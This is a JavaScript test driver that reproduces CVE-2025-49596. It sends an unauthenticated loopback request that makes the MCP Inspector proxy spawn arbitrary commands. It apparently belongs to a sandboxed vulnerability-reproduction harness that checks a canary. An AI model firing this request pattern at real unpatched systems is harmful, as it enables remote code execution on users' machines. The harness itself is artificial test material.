// Scripted attacker for the MCP Inspector proxy (CVE-2025-49596). The proxy's /stdio endpoint
// spawns an arbitrary local process from the `command`/`args` query parameters. In the
// vulnerable build it has no authentication or origin check, so malicious web content in the
// victim's browser can issue a cross-origin GET to the loopback proxy and run any command.
//
// This driver plays both the proxy host (it starts the real server) and the attacker (it fires
// the request to 127.0.0.1), all inside one container with no egress (--network none, loopback).
// The spawned command writes a per-trial canary; the oracle checks it in the same container.
import { spawn } from "node:child_process";
import * as fs from "node:fs";

const [, , arm, nonce] = process.argv;
const PORT = 6277;
const spec = JSON.parse(
  fs.readFileSync(`/case/inputs/${arm}.json`, "utf-8").replaceAll("{{NONCE}}", nonce)
);

const srv = spawn("node", ["--import", "tsx", "/app/server/src/index.ts"], {
  env: { ...process.env, PORT: String(PORT) },
  stdio: ["ignore", "inherit", "inherit"],
});

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function ready() {
  for (let i = 0; i < 60; i++) {
    try {
      const r = await fetch(`http://127.0.0.1:${PORT}/health`);
      if (r.ok) return true;
    } catch {}
    await sleep(500);
  }
  return false;
}

try {
  if (!(await ready())) throw new Error("proxy server did not become ready");
  const url =
    `http://127.0.0.1:${PORT}/stdio?transportType=stdio` +
    `&command=${encodeURIComponent(spec.command)}` +
    `&args=${encodeURIComponent(spec.args)}`;
  // Fire the unauthenticated request; the proxy spawns the process while opening the SSE stream.
  // We only need the headers (and the side effect), never the stream body.
  try {
    const r = await fetch(url, { headers: { accept: "text/event-stream" } });
    console.log("proxy /stdio HTTP", r.status);
  } catch (e) {
    console.log("client fetch error", e?.cause?.code || e?.message);
  }
  await sleep(1500); // let the spawned command write its canary
} finally {
  srv.kill("SIGKILL");
}
